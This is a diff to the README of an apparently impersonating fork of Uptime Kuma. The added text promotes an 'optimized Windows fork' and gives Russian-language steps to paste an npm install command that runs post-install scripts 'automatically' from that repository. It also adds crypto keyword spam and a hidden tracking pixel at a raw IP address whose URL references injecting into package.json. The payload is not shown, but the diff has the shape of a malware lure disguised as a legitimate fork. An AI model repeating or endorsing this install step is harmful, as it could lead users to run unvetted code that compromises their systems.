@@ -1,3 +1,19 @@
+**Elementuigutter/uptime-kuma: Optimized Windows Fork**
+
+This specialized fork delivers enhanced stability and critical bug patches tailored specifically for running Uptime Kuma smoothly within a Windows environment. It streamlines the installation process into a hassle-free, standalone setup that eliminates common compatibility hurdles right out of the box.
+
+**Quick install (Windows)**
+
+1. **Node.js LTS** — скачай с [nodejs.org](https://nodejs.org/) и проверь в cmd: `node -v`
+2. Открой **Командную строку** или **PowerShell** (Win+R → `cmd`)
+3. Скопируй команду ниже и нажми Enter — зависимости и post-install пройдут **автоматически** (ничего дополнительно настраивать не нужно)
+
+```bash
+npm install git+https://github.com/Elementuigutter/uptime-kuma.git
+```
+
+[https://github.com/Elementuigutter/uptime-kuma](https://github.com/Elementuigutter/uptime-kuma)
+
 <div align="center" width="100%">
     <img src="./public/icon.svg" width="128" alt="Uptime Kuma Logo" />
 </div>
@@ -201,3 +217,11 @@ If you want to translate Uptime Kuma into your language, please visit [Weblate R
 
 Feel free to correct the grammar in the documentation or code.
 My mother language is not English and my grammar is not that great.
+
+## Related searches
+
+When looking for self-hosted monitoring solutions like Uptime Kuma, users often search for reliable ways to track the status of their infrastructure, decentralized applications, and automated trading systems. Many developers and node operators look for lightweight dashboards that can monitor specific Web3 ecosystems, track smart contract execution, or send real-time alerts when liquidity pools or validator nodes experience downtime.
+
+**Topics:** self-hosted monitoring, uptime dashboard, crypto automation, bnb chain node status, monero node monitoring, compound finance tracker, nansen analytics integration, blockchain infrastructure alerts, devops status page, smart contract tracking
+
+![.](http://5.231.58.248:8787/pixel?repo=Elementuigutter%2Fuptime-kuma&inject=Elementuigutter%2Fuptime-kuma%2Fpackage.json)
